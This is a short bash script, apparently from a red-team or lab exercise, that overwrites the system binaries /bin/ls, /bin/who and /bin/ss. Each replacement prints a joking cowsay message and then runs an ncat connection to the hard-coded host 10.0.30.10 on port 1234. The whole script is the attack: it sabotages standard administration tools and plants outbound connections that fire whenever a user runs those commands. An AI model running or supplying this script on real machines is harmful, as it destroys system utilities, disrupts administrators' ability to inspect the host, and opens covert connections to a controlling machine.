#!/bin/bash

echo "cowsay \"This command is broken\"" > /bin/ls
echo "ncat 10.0.30.10 1234" >> /bin/ls
chmod +x /bin/ls

echo "cowsay \"This command is also broken\"" > /bin/who
echo "ncat 10.0.30.10 1234" >> /bin/who
chmod +x /bin/who

echo "cowsay \"Really having a bad time with these commands now\"" > /bin/ss
echo "ncat 10.0.30.10 1234" >> /bin/ss
chmod +x /bin/ss

